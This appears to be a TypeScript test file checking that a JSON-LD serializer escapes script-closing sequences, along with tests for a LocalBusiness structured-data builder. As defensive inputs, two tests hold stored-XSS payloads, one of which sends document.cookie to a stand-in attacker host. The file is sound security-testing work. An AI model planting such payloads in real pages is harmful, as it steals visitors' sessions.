import { describe, expect, it } from "vitest";
import { localBusinessJsonLd, serializeJsonLd } from "@/modules/seo/structured-data";

/**
 * TEST-821 to TEST-823 — the one place in the public site that writes into a
 * script element.
 *
 * Phase 07's guarantee is that nothing on a tenant website interprets markup.
 * JSON-LD is the single documented exception, because structured data has no
 * other delivery mechanism. An exception that is not attacked in a test is just
 * a hole with a comment above it, so these tests play the attacker: the payload
 * is a business name that tries to close its own script tag and take over the
 * page.
 */

describe("serializeJsonLd", () => {
  it("escapes every < so a value cannot close the script element (TEST-821)", () => {
    const payload = serializeJsonLd({ name: "</script><img src=x onerror=alert(1)>" });
    expect(payload).not.toContain("<");
    expect(payload).toContain("\\u003c");
  });

  /*
   * TEST-822 - the concrete attack, spelled out.
   *
   * If this string reached the browser unescaped, the HTML parser would end the
   * script at `</script>` - it does not care that the sequence sits inside a
   * JSON string - and everything after it would be parsed as markup. That is
   * stored XSS on the tenant's own origin, which is where their customers'
   * sessions live.
   */
  it("renders a </script> payload inert (TEST-822)", () => {
    const attack = '</script><script>fetch("https://evil.example/"+document.cookie)</script>';
    const payload = serializeJsonLd({ "@type": "LocalBusiness", name: attack });

    expect(payload.toLowerCase()).not.toContain("</script");
    expect(payload.toLowerCase()).not.toContain("<script");
  });

  it("stays valid JSON after the escaping, carrying the value intact (TEST-823)", () => {
    const attack = "</script><b>x</b>";
    const payload = serializeJsonLd({ name: attack });

    // The escaping must not corrupt the data: `\u003c` IS `<` to a JSON
    // parser, so the round trip returns exactly what the business typed.
    const parsed = JSON.parse(payload) as { name: string };
    expect(parsed.name).toBe(attack);
  });

  it("escapes the line separators that some JavaScript parsers still choke on", () => {
    const payload = serializeJsonLd({ name: "a\u2028b\u2029c" });
    expect(payload).toContain("\\u2028");
    expect(payload).toContain("\\u2029");
    expect((JSON.parse(payload) as { name: string }).name).toBe("a\u2028b\u2029c");
  });

  it("survives an ampersand and a quote without mangling them", () => {
    const payload = serializeJsonLd({ name: 'Sugu & Rolls "Miraflores"' });
    expect((JSON.parse(payload) as { name: string }).name).toBe('Sugu & Rolls "Miraflores"');
  });
});

describe("localBusinessJsonLd", () => {
  it("emits the fields a business filled in", () => {
    const data = localBusinessJsonLd({
      name: "Sugu Rolls",
      url: "https://sugurolls.com",
      description: "Comida japonesa.",
      imageUrl: "https://cdn.example/logo.png",
      phone: "+51 987 654 321",
      addressLine: "Av. Larco 123",
      district: "Miraflores",
      city: "Lima",
    });

    expect(data["@type"]).toBe("LocalBusiness");
    expect(data.name).toBe("Sugu Rolls");
    expect(data.telephone).toBe("+51 987 654 321");
    expect(data.address).toEqual({
      "@type": "PostalAddress",
      streetAddress: "Av. Larco 123",
      addressLocality: "Miraflores",
      addressRegion: "Lima",
    });
  });

  it("omits what is not filled in rather than emitting empty properties", () => {
    const data = localBusinessJsonLd({
      name: "Sugu Rolls",
      url: "https://sugurolls.com",
      description: null,
      imageUrl: null,
      phone: null,
      addressLine: null,
      district: null,
      city: null,
    });

    expect(Object.keys(data).sort()).toEqual(["@context", "@type", "name", "url"]);
  });

  it("builds a partial address from the fields that exist", () => {
    const data = localBusinessJsonLd({
      name: "Sugu Rolls",
      url: "https://sugurolls.com",
      description: null,
      imageUrl: null,
      phone: null,
      addressLine: null,
      district: null,
      city: "Lima",
    });

    expect(data.address).toEqual({ "@type": "PostalAddress", addressRegion: "Lima" });
  });
});
